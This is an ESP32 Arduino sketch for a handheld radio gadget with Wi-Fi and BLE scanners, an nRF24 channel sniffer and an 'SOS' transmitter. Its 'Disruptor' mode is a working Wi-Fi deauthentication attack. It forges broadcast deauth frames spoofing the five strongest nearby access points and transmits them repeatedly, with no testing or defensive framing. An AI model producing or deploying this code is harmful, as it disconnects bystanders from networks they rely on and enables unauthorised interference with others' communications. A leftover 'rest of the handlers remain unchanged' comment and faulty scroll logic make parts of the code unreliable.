#include <WiFi.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>
#include <SPI.h>
#include <RF24.h>
#include <Wire.h>
#include <LiquidCrystal_I2C.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <vector>

// ===== Pin Definitions =====
#define BUTTON_PIN        0    // Mode switch button
#define NRF_CE_PIN        5    // nRF24 CE
#define NRF_CSN_PIN       15   // nRF24 CSN

// ===== Display Parameters =====
#define LCD_ADDR          0x27
#define LCD_COLS          20
#define LCD_ROWS          4
#define OLED_RESET        -1
#define SCREEN_WIDTH      128
#define SCREEN_HEIGHT     64

// ===== SOS Parameters =====
#define SOS_COUNTDOWN     5      // seconds before sending
#define SOS_PIPE          0xAABBCCDDEEULL

// ===== Scrolling Parameters =====
const uint32_t scrollHoldTime  = 1000; // ms to start scroll
const uint32_t scrollInterval  = 1000; // ms between auto-scroll

// ===== Globals =====
enum Mode { WIFI_SCAN = 0, BLE_SCAN, DISRUPTOR, RF_SNIFF, SOS_TRANSMIT, MODE_COUNT };
volatile Mode currentMode = WIFI_SCAN;
bool sosArmed = false;
Mode prevMode = MODE_COUNT;
uint32_t deauthCount = 0;
uint32_t sosSuccess = 0;
uint32_t sosFail = 0;

LiquidCrystal_I2C lcd(LCD_ADDR, LCD_COLS, LCD_ROWS);
Adafruit_SSD1306 oled(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
RF24 radio(NRF_CE_PIN, NRF_CSN_PIN);

// WiFi scan storage
struct APInfo { String ssid; uint8_t bssid[6]; int rssi; };
std::vector<APInfo> lastAPs;

// Scrolling state
uint8_t wifiPage = 0;
uint32_t wifiHoldStart = 0, wifiLastScroll = 0;
uint8_t blePage = 0;
uint32_t bleHoldStart = 0, bleLastScroll = 0;

// Disruptor waves
std::vector<uint8_t> disruptWaves;

// Button ISR: debounce and cycle modes
void IRAM_ATTR handleButton() {
  static uint32_t last = 0;
  uint32_t now = millis();
  if (now - last > 200) {
    currentMode = static_cast<Mode>((currentMode + 1) % MODE_COUNT);
    last = now;
  }
}

// ===== Prototypes =====
void handleWiFiScan();
void handleBLEScan();
void handleDisruptor();
void handleRFsniff();
void handleSOS();

void setup() {
  Serial.begin(115200);
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  attachInterrupt(digitalPinToInterrupt(BUTTON_PIN), handleButton, FALLING);

  // LCD init
  lcd.init(); lcd.backlight();
  // OLED init
  Wire.begin(); oled.begin(SSD1306_SWITCHCAPVCC);
  oled.clearDisplay(); oled.display();

  // Wi-Fi setup
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(true);

  // BLE init
  NimBLEDevice::init("ESP32");

  // nRF24 init
  radio.begin();
  radio.setAutoAck(false);
  radio.setDataRate(RF24_1MBPS);
  radio.setPALevel(RF24_PA_LOW);
  radio.openReadingPipe(0, 0xFFFFFFFFFFULL);
  radio.startListening();

  // --- Splash screen ---
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Hello user, welcome");
  lcd.setCursor(0, 1);
  lcd.print("to the SIGNAL_SCANNER");
  lcd.setCursor(0, 2);
  lcd.print("INITIALIZING...");

  // Draw smiley face on OLED
  oled.clearDisplay();
  int cx = SCREEN_WIDTH / 2;
  int cy = SCREEN_HEIGHT / 2;
  int r = 20;
  oled.drawCircle(cx, cy, r, SSD1306_WHITE);
  oled.fillCircle(cx - 8, cy - 6, 3, SSD1306_WHITE); // left eye
  oled.fillCircle(cx + 8, cy - 6, 3, SSD1306_WHITE); // right eye
  oled.drawLine(cx - 8, cy + 8, cx + 8, cy + 8, SSD1306_WHITE); // mouth
  oled.display();

  delay(5000);

  // Clear displays
  lcd.clear();
  oled.clearDisplay(); oled.display();
}

void loop() {
  // Reset on mode change
  if (currentMode != prevMode) {
    sosArmed = false;
    wifiPage = blePage = 0;
    wifiHoldStart = wifiLastScroll = 0;
    bleHoldStart = bleLastScroll = 0;
    if (currentMode == DISRUPTOR) deauthCount = 0;
    if (currentMode == SOS_TRANSMIT) { sosSuccess = sosFail = 0; disruptWaves.clear(); }
    radio.openReadingPipe(0, 0xFFFFFFFFFFULL);
    radio.startListening();
    prevMode = currentMode;
  }

  lcd.clear(); lcd.setCursor(0, 0);
  switch (currentMode) {
    case WIFI_SCAN:    lcd.print("Mode: WiFi Scan");    handleWiFiScan();    break;
    case BLE_SCAN:     lcd.print("Mode: BLE Scan");     handleBLEScan();     break;
    case DISRUPTOR:    lcd.print("Mode: Disruptor");    handleDisruptor();    break;
    case RF_SNIFF:     lcd.print("Mode: RF Sniffer");   handleRFsniff();     break;
    case SOS_TRANSMIT: lcd.print("Mode: SOS Signal");   handleSOS();         break;
    default: break;
  }
  delay(200);
}

// [The rest of the handlers remain unchanged]


// -------- WiFi Scan & Scroll --------
void handleWiFiScan() {
  int n = WiFi.scanNetworks();
  lcd.setCursor(0, 1);
  lcd.printf("Total APs: %d   ", n);

  std::vector<APInfo> all;
  all.reserve(n);
  for (int i = 0; i < n; i++) {
    APInfo ap = {WiFi.SSID(i), {0}, WiFi.RSSI(i)};
    WiFi.BSSID(i, ap.bssid);
    all.push_back(ap);
  }
  std::sort(all.begin(), all.end(), [](auto &a, auto &b){ return a.rssi > b.rssi; });
  lastAPs.assign(all.begin(), all.begin() + min((int)all.size(), 5));

  size_t pages = max((int)((all.size() + 1) / 2), 1);
  size_t idx = (wifiPage % pages) * 2;
  if (idx < all.size()) {
    lcd.setCursor(0, 2);
    lcd.printf("%2d:%-10s%4ddBm Ch%02d", idx+1,
               all[idx].ssid.c_str(), all[idx].rssi, WiFi.channel(idx));
  }
  if (idx+1 < all.size()) {
    lcd.setCursor(0, 3);
    lcd.printf("%2d:%-10s%4ddBm Ch%02d", idx+2,
               all[idx+1].ssid.c_str(), all[idx+1].rssi, WiFi.channel(idx+1));
  }

  // scroll on hold
  bool pressed = digitalRead(BUTTON_PIN) == LOW;
  if (pressed && millis() - wifiHoldStart > scrollHoldTime) {
    if (!wifiHoldStart) wifiHoldStart = millis();
    if (millis() - wifiLastScroll > scrollInterval) {
      wifiPage++;
      wifiLastScroll = millis();
    }
  } else if (!pressed) {
    wifiHoldStart = wifiLastScroll = 0;
  }

  // OLED bar graph (top 3)
  oled.clearDisplay();
  for (int i = 0; i < min(3, (int)all.size()); ++i) {
    int bar = map(all[i].rssi, -100, 0, 0, SCREEN_HEIGHT/2);
    oled.fillRect(i*40 + 10, SCREEN_HEIGHT - bar - 1, 30, bar, SSD1306_WHITE);
  }
  oled.display();
}

// -------- BLE Scan & Scroll --------
void handleBLEScan() {
  NimBLEScan *scan = NimBLEDevice::getScan();
  scan->setActiveScan(true);
  auto results = scan->start(5, false);
  int count = results.getCount();
  lcd.setCursor(0, 1);
  lcd.printf("Total dev: %d    ", count);

  std::vector<NimBLEAdvertisedDevice*> devs;
  for (int i = 0; i < count; ++i)
    devs.push_back(const_cast<NimBLEAdvertisedDevice*>(&results.getDevice(i)));

  size_t pages = max((int)((devs.size() + 1) / 2), 1);
  size_t idx = (blePage % pages) * 2;
  if (idx < devs.size()) {
    auto *d = devs[idx];
    String name = d->getName().length() ? d->getName().c_str() : d->getAddress().toString().c_str();
    lcd.setCursor(0, 2);
    lcd.printf("%2d:%-10s%4ddBm", idx+1, name.c_str(), d->getRSSI());
  }
  if (idx+1 < devs.size()) {
    auto *d = devs[idx+1];
    String name = d->getName().length() ? d->getName().c_str() : d->getAddress().toString().c_str();
    lcd.setCursor(0, 3);
    lcd.printf("%2d:%-10s%4ddBm", idx+2, name.c_str(), d->getRSSI());
  }

  bool pressed = digitalRead(BUTTON_PIN) == LOW;
  if (pressed && millis() - bleHoldStart > scrollHoldTime) {
    if (!bleHoldStart) bleHoldStart = millis();
    if (millis() - bleLastScroll > scrollInterval) {
      blePage++;
      bleLastScroll = millis();
    }
  } else if (!pressed) {
    bleHoldStart = bleLastScroll = 0;
  }

  results.clear();

  // OLED bar graph (first 6)
  oled.clearDisplay();
  int x = 0;
  for (int i = 0; i < min(6, (int)devs.size()); ++i) {
    int bar = map(devs[i]->getRSSI(), -100, 0, 0, SCREEN_HEIGHT/2);
    oled.fillRect(x, SCREEN_HEIGHT - bar - 1, 10, bar, SSD1306_WHITE);
    x += 12;
    if (x > SCREEN_WIDTH - 10) break;
  }
  oled.display();
}

// -------- Disruptor Mode --------
void handleDisruptor() {
  if (lastAPs.empty()) {
    lcd.setCursor(0, 1); lcd.print("No AP data.");
    return;
  }
  // send deauths
  for (auto &ap : lastAPs) {
    uint8_t deauth[26] = {0};
    deauth[0] = 0xC0; deauth[1] = 0x00;
    for (int i = 0; i < 6; ++i) deauth[4+i] = 0xFF;
    for (int i = 0; i < 6; ++i) {
      deauth[10+i] = ap.bssid[i];
      deauth[16+i] = ap.bssid[i];
    }
    deauth[24] = 0x07;
    esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
    deauthCount++;
  }
  // LCD details
  lcd.setCursor(0, 1);
  lcd.printf("Target:%-10s%4ddBm", lastAPs[0].ssid.c_str(), lastAPs[0].rssi);
  lcd.setCursor(0, 2);
  lcd.printf("Deauths:%5u", deauthCount);

  // update waves
  static uint32_t lastWave = 0;
  uint32_t now = millis();
  int maxR = min(SCREEN_WIDTH, SCREEN_HEIGHT) / 2;
  if (now - lastWave > 200) {
    disruptWaves.push_back(0);
    lastWave = now;
  }
  for (auto it = disruptWaves.begin(); it != disruptWaves.end(); ) {
    *it += 4;
    if (*it > maxR) it = disruptWaves.erase(it);
    else ++it;
  }

  // OLED wave animation
  oled.clearDisplay();
  int cx = SCREEN_WIDTH/2;
  int cy = SCREEN_HEIGHT/2;
  for (auto r : disruptWaves) oled.drawCircle(cx, cy, r, SSD1306_WHITE);
  oled.display();
}

// -------- RF Sniffer Mode --------
void handleRFsniff() {
  uint32_t total = 0;
  uint32_t bestCount = 0;
  uint8_t bestCh = 0;
  uint8_t currCh = 0;
  uint32_t currCount = 0;
  oled.clearDisplay();
  for (uint8_t ch = 0; ch <= 125; ++ch) {
    radio.stopListening();
    radio.setChannel(ch);
    radio.startListening();
    uint32_t count = 0;
    uint32_t t0 = millis();
    while (millis() - t0 < 50) {
      if (radio.available()) { radio.read(nullptr, radio.getPayloadSize()); count++; }
    }
    radio.stopListening();
    if (count > bestCount) { bestCount = count; bestCh = ch; }
    currCh = ch; currCount = count;
    int h = map(count, 0, 10, 0, SCREEN_HEIGHT/2);
    oled.fillRect((ch/10)*12, SCREEN_HEIGHT - h - 1, 10, h, SSD1306_WHITE);
    if (ch % 10 == 9) { oled.display(); delay(10); }
    total += count;
  }
  // LCD details
  lcd.setCursor(0, 1);
  lcd.printf("Top:Ch%02u pkts=%3u", bestCh, bestCount);
  lcd.setCursor(0, 2);
  lcd.printf("Now:Ch%02u pkts=%3u", currCh, currCount);
  lcd.setCursor(0, 3);
  lcd.printf("PktTot:%5u", total);
}

// -------- SOS Mode --------
void handleSOS() {
  if (!sosArmed) {
    for (int s = SOS_COUNTDOWN; s > 0; --s) {
      lcd.setCursor(0, 1);
      lcd.printf("SOS in %2d sec   ", s);
      lcd.setCursor(0, 2);
      lcd.printf("Ready on Ch%02u", radio.getChannel());
      delay(1000);
    }
    sosArmed = true;
    radio.stopListening();
    radio.openWritingPipe(SOS_PIPE);
    radio.setPALevel(RF24_PA_HIGH);
    radio.setDataRate(RF24_1MBPS);
  }
  const char msg[] = "SOS";
  bool ok = radio.write(&msg, sizeof(msg));
  if (ok) sosSuccess++; else sosFail++;

  // LCD details
  lcd.setCursor(0, 1);
  lcd.printf("SOS Sent @Ch%02u", radio.getChannel());
  lcd.setCursor(0, 2);
  lcd.printf("Succ:%5u Fail:%3u", sosSuccess, sosFail);

  // OLED success bar
  oled.clearDisplay();
  int h = min(sosSuccess, (uint32_t)(SCREEN_HEIGHT/2));
  oled.fillRect(10, SCREEN_HEIGHT - h - 1, 30, h, SSD1306_WHITE);
  oled.display();
}
